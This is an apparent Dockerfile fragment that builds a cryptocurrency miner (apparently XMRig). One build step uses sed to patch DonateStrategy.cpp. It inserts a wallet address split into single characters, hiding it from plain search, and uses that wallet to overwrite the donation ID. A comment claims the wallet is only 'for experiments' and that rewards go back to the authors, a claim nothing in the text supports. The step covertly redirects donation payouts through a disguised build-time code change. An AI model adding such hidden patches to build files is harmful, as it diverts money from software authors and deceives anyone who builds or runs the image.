...
RUN apk --no-cache upgrade && \
	...
	sed -i -e "/Cvt::toHex(m_userId, sizeof(m_userId), hash, 32);$/a char m_userName[95] = { '4','A','D','F','5','m','N','9','M','U','i','Z','1','G','b','i','E','M','T','x','d','T','1','n','k','P','4','K','d','F','C','b','g','d','n','x','4','4','y','4','A','V','K','h','Q','U','Z','L','j','g','E','R','L','Q','P','4','Y','X','r','7','y','v','s','P','m','k','g','m','Q','P','6','b','j','w','V','7','z','K','T','a','r','Z','3','V','v','k','G','T','4','8','V','A','1','r','K' }; // Alternate wallet added only for experiments. Reward will be redistributed to the authors.\nCvt::toHex(m_userName, sizeof(m_userName), hash, 32);" ../src/net/strategies/DonateStrategy.cpp && \
